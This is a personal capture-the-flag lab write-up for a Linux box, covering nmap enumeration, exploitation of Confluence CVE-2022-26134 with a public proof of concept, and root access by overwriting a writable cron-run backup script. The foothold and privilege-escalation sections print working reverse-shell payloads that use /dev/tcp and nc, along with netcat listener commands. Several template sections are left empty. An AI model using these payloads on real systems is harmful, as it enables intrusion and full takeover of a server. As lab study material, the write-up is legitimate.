

## Lab Details
- Difficulty: Intermediate 
- OS: Linux
- Foothold time:  20 minutes 
- Privesc time: 30 minutes 
- Total solve time: 50 minutes 

## Summary
- Initial access:  CVE-2022-26134
- Privilege escalation: Scheduled backup script

## Enumeration
- Key findings:
	- Found a vulnerable version of Atlassian Confluence on port 8090
##### Steps
- run `nmap`
```

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
|_http-trane-info: Problem with XML parsing of /evox/about
8091/tcp open  jamlink?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Thu, 02 Apr 2026 21:38:40 GMT
|     Connection: Close
|   GetRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Thu, 02 Apr 2026 21:38:10 GMT
|     Connection: Close
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Thu, 02 Apr 2026 21:38:10 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Thu, 02 Apr 2026 21:38:10 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Thu, 02 Apr 2026 21:38:45 GMT
|     Connection: Keep-Alive
|_    content-length: 0
```
- Found a vulnerable version of Atlassian Confluence on port 8090
![[Pasted image 20260403062906.png]]
## Foothold
- Path:
- Key commands: 
##### Steps
- Download POC https://github.com/jbaines-r7/through_the_wire
- Execute the POC 
```
$ python3 through_the_wire.py --rhost 192.168.53.41 --rport 8090 --lhost 192.168.49.53 --lport 80 --protocol http:// --reverse-shell
<SNIP>
[+] Generating a reverse shell payload
[+] Sending expoit at http://192.168.53.41:8090/
listening on [any] 80 ...
connect to [192.168.49.53] from (UNKNOWN) [192.168.53.41] 40378
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
```
- Reverse shell received as `confluence` user
```
$ nc -lvnp 21                      
listening on [any] 21 ...
connect to [192.168.49.53] from (UNKNOWN) [192.168.53.41] 40802
confluence@flu:/opt/atlassian/confluence/bin$
```
## Lateral Movement 
- Path:
- Key commands:
##### Steps

## Privilege Escalation
- Path: Custom backup script 
- Key commands:
##### Steps
- Found a backup script in `/opt` directory 
```bash
-rwxr-xr-x  1 confluence confluence       408 Dec 12  2023 log-backup.sh
confluence@flu:/opt$ cat log-backup.sh 
#!/bin/bash

CONFLUENCE_HOME="/opt/atlassian/confluence/"
LOG_DIR="$CONFLUENCE_HOME/logs"
BACKUP_DIR="/root/backup"
TIMESTAMP=$(date "+%Y%m%d%H%M%S")

# Create a backup of log files
cp -r $LOG_DIR $BACKUP_DIR/log_backup_$TIMESTAMP

tar -czf $BACKUP_DIR/log_backup_$TIMESTAMP.tar.gz $BACKUP_DIR/log_backup_$TIMESTAMP

# Cleanup old backups
find $BACKUP_DIR -name "log_backup_*"  -mmin +5 -exec rm -rf {} \;

```
- confirmed with `pspy64` its been executed every minute 
```
confluence@flu:/tmp$ ./pspy64 -pf -i 1000 
<SNIP>
2026/04/02 22:11:01 CMD: UID=0     PID=42846  | find /root/backup -name log_backup_* -mmin +5 -exec rm -rf {} ; 
2026/04/02 22:11:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2026/04/02 22:11:01 FS:                 OPEN | /usr/bin/rm
2026/04/02 22:11:01 FS:               ACCESS | /usr/bin/rm
2026/04/02 22:11:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/04/02 22:11:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
2026/04/02 22:11:01 FS:                 OPEN | /etc/ld.so.cache
2026/04/02 22:11:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/04/02 22:11:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc.so.6
2026/04/02 22:11:01 FS:        CLOSE_NOWRITE | /etc/ld.so.cache
2026/04/02 22:11:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2026/04/02 22:11:01 CMD: UID=0     PID=42847  | rm -rf /root/backup/log_backup_20260402220601 

```
- Change the file content of the backup script to a reverse shell payload 
```
confluence@flu:/opt$ cat log-backup.sh 
/bin/bash -i >& /dev/tcp/192.168.49.53/23 0>&1
<tmp/f|/bin/bash -i 2>&1|nc 192.168.49.53 23 >/tmp/f' > log-backup.sh 
```
- Wait for a minute and receive shell is received  as root
```
$ nc -lvnp 23                      
listening on [any] 23 ...
connect to [192.168.49.53] from (UNKNOWN) [192.168.53.41] 52570
bash: cannot set terminal process group (43052): Inappropriate ioctl for device
bash: no job control in this shell
root@flu:~# id 
id
uid=0(root) gid=0(root) groups=0(root)
```
## Lessons Learned
- Attack family:
- Key takeaway:
##### Steps

## Resources
- References: